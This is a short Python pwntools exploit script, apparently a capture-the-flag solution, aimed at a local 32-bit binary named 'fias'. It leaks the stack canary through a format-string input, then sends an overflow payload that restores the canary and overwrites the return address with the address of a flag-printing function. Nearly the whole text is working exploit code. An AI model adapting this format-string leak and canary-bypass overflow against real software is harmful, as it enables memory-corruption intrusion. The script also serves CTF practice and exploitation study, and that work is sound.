from pwn import *

# AAAA 0xf7f93ad4 0x3e8 0x8049246 0xf7f60000 0xf7f60000 0x41414141
# AAAA %p %p %p %p %p %p %p %p %p %p
sh = process("./fias")
sh.recvuntil("name? ")

# Leak canary
offset = 11
payload = "%{}$p".format(offset)
sh.sendline(payload)

print(sh.recvuntil("you, ").decode(), end="")
canary = sh.recvuntil("!").decode()
print(canary)
canary = int(canary.split("!")[0], 16)

# Overflow
offset_canary = 4*6+1
offset_ret = 3*4
flag = 0x80491d2 # PIE not enabled
print(sh.recvuntil("canary?").decode())
payload = b" "*offset_canary + p32(canary) + b" "*offset_ret + p32(flag) + "".join([str(i)*4 for i in range(9)]).encode()

sh.sendline(payload)

sh.interactive()